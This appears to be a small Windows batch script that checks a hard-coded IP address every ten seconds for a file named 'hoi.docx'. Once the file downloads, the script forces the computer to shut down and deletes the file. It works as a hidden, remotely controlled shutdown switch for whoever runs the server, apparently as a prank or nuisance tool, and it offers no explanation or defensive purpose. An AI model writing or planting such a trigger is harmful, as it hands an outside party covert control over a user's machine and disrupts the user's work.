:loop

REM Waiting
timeout /t 10 > nul

REM Donwloading file
powershell -Command "Invoke-WebRequest http://194.163.144.73:2000/wp-content/uploads/2021/12/hoi.docx -Outfile hoi.docx"

REM Checks if file is downloaded
if errorlevel 1 goto loop

REM Shutdown PC
SHUTDOWN /s /t 60

REM Delete hoi.docx
del "hoi.docx" /f /q

exit